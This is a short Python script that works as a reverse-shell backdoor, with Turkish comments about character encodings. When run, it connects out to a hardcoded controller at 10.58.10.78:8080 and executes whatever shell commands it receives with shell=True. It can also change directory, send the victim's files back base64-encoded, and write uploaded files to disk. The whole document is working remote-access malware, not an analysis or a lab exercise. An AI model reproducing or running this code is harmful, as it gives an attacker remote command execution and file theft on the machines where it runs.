# coding=utf-8
import socket, subprocess
import simplejson
import os
import base64

class MySocket():

    def __init__(self, host, port):
        self.decodeCodec = "cp857" #cp857 çalışmazsa "cp1254" deneyin oda çalışmazda siteden turkish olanları deneyin.
                                   #Başka bir değişiklik yapmaya gerek yok programı sadece burdan değişecek şekilde ayarladım.
                                   #decode listesi: https://docs.python.org/2.4/lib/standard-encodings.html
        self.myConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.myConnection.connect((host, port)) 

    def execCdCommand(self,directory):
        os.chdir(directory)
        return "cd to "+ directory

    def saveFile(self, path, content):

        with open(path, "wb") as myFile:
            myFile.write(base64.b64decode(content))
            return "Upload OK"

    def getFileContents(self,path):
        with open(path,"rb") as MyFile:
            return base64.b64encode(MyFile.read())

    def jsonSend(self,data):
        jsonBytes=data.decode(self.decodeCodec)
        jsonData=simplejson.dumps(jsonBytes)
        #print(type(jsonData))
        return self.myConnection.send(jsonData.encode(self.decodeCodec))

    def jsonRecv(self):
        jsonData=""
        while True:#gelen paketleri tam almak için
            try:
                jsonData=jsonData+self.myConnection.recv(1024).decode()
                return simplejson.loads(jsonData)
            except ValueError:
                continue

    def commandExecuter(self, command):
        return subprocess.check_output(command, shell=True)

    def startSocket(self):
        while True:
            command = self.jsonRecv()
            try:
                if command[0]=="quit":
                    self.myConnection.close()
                    exit()
                elif command[0]=="cd" and len(command) > 1:
                    commandExe=self.execCdCommand(command[1]).encode(self.decodeCodec)
                elif command[0]=="download":
                    commandExe=self.getFileContents(command[1])
                    #print(type(commandExe))

                elif command[0]=="upload":
                    commandExe=self.saveFile(command[1],command[2]).encode(self.decodeCodec)
                    #print(type(commandExe))
                else:
                    commandExe = self.commandExecuter(command)  
            except Exception:
                commandExe="Error!".encode(self.decodeCodec)
            self.jsonSend(commandExe)
        self.myConnection.close()


mySocket = MySocket("10.58.10.78", 8080)
mySocket.startSocket()
